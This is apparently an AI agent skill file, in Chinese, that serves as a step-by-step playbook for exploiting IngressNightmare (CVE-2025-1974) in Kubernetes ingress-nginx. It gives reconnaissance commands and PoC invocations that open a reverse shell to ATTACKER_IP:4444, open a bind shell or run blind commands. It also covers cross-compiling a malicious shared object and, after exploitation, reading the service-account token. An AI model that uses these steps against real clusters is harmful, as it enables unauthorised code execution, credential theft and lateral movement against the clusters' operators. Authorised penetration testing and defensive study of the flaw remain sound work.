---
name: k8s-ingress-nightmare
description: "IngressNightmare (CVE-2025-1974) — Kubernetes Ingress-NGINX Admission Controller 未授权 RCE。当目标 K8s 集群使用 ingress-nginx、发现 443/8443 端口的 admission webhook、或通过 Pod 网络可达 admission controller 时使用。涵盖漏洞原理、利用条件判断、PoC 使用、后续横向移动。"
metadata:
  tags: "k8s,kubernetes,ingress-nginx,cve-2025-1974,ingressnightmare,rce,admission,webhook,云原生"
  category: "cloud"
---

# IngressNightmare — CVE-2025-1974

Ingress-NGINX Admission Controller 未授权 RCE 漏洞链（CVSSv3 9.8），无需任何 K8s 凭据即可从 Pod 网络远程执行任意代码。

## ⛔ 深入参考（必读）

- 漏洞原理与利用细节 → [references/exploit-details.md](references/exploit-details.md)

---

## 漏洞概述

IngressNightmare 是一组**漏洞链**（CVE-2025-24514 / CVE-2025-1097 / CVE-2025-1098 / CVE-2025-1974），攻击者通过两步实现 RCE：

1. 向 NGINX 发送大请求，使其缓存为临时文件（`/tmp/` 下可预测路径）
2. 向 Admission Webhook 发送恶意 `AdmissionReview`，注入 `ssl_engine` 指令加载恶意 `.so`
3. Webhook 运行 `nginx -t` 检查配置时触发代码执行

## Phase 1: 前置条件确认

### 1.1 确认目标使用 ingress-nginx
```bash
# 从集群外部
nmap -sV -p 443,8443,80 TARGET_IP
curl -sk https://TARGET_IP/ -I  # 看 Server 头是否包含 nginx

# 从 Pod 内部
kubectl get pods -n ingress-nginx 2>/dev/null
kubectl get svc -n ingress-nginx 2>/dev/null
env | grep -i ingress
```

### 1.2 定位 Admission Webhook
```bash
# Admission webhook 默认监听 8443 端口
# 从 Pod 网络内部探测
INGRESS_SVC=$(kubectl get svc -n ingress-nginx -o jsonpath='{.items[0].spec.clusterIP}' 2>/dev/null)
curl -sk https://${INGRESS_SVC}:8443/networking/v1/ingresses

# 也可以直接探测 Pod IP
kubectl get pods -n ingress-nginx -o wide 2>/dev/null
```

### 1.3 定位 NGINX Uploader（请求缓存端点）
```bash
# NGINX 监听在 80/443，需要能向其发送大请求
# uploader 就是 ingress-nginx 的 HTTP 入口
UPLOADER="http://${INGRESS_SVC}:80"
# 或直接用 Pod IP
UPLOADER="http://POD_IP:80"
```

## Phase 2: 利用

### 2.1 使用 ingressNightmare PoC

```bash
# 反弹 shell（最常用）
ingressnightmare -m r -r ATTACKER_IP -p 4444 -i https://INGRESS:8443 -u http://UPLOADER:80

# 绑定 shell
ingressnightmare -m b -b 9999 -i https://INGRESS:8443 -u http://UPLOADER:80

# 盲执行命令
ingressnightmare -m c -c 'id > /tmp/pwn' -i https://INGRESS:8443 -u http://UPLOADER:80
```

### 2.2 注入变体选择

| 注入方式 | 参数 | CVE |
|----------|------|-----|
| auth-url（默认） | `--is-auth-url` | CVE-2025-24514 |
| auth-tls-match-cn | `--is-match-cn --auth-secret-name NAME` | CVE-2025-1097 |
| mirror UID | `--is-mirror-uid` | CVE-2025-1098 |

### 2.3 目标架构不匹配处理

```bash
# 如果出现 "Exec format error"，目标可能是 arm64
ingressnightmare show-c > exp.c
# 用目标架构的交叉编译器编译
aarch64-linux-gnu-gcc -fPIC -nostdlib -ffreestanding -fno-builtin -o danger.so exp.c -shared
ingressnightmare -m c -c 'id' --so ./danger.so -i https://INGRESS:8443 -u http://UPLOADER:80
```

## Phase 3: 后续利用

RCE 落地在 ingress-nginx Pod 内，通常拥有高权限 ServiceAccount：

```bash
# 获取 SA Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 检查 RBAC 权限（ingress-nginx 通常有 cluster-wide 权限）
kubectl auth can-i --list

# 横向 → 参考 k8s-container-escape skill
```

## 工具速查

| 工具 | 用途 | 安装 / 路径 |
|------|------|-------------|
| ingressnightmare | CVE-2025-1974 一体化 PoC（Go 编译，多平台） | `f8x -cloud` 安装到 PATH；arsenal 投递物在 `/pentest/arsenal/ingressnightmare/` |
| kubectl | K8s 集群管理 | `f8x -cloud` |
| nmap | 端口探测 | `apt install nmap` |
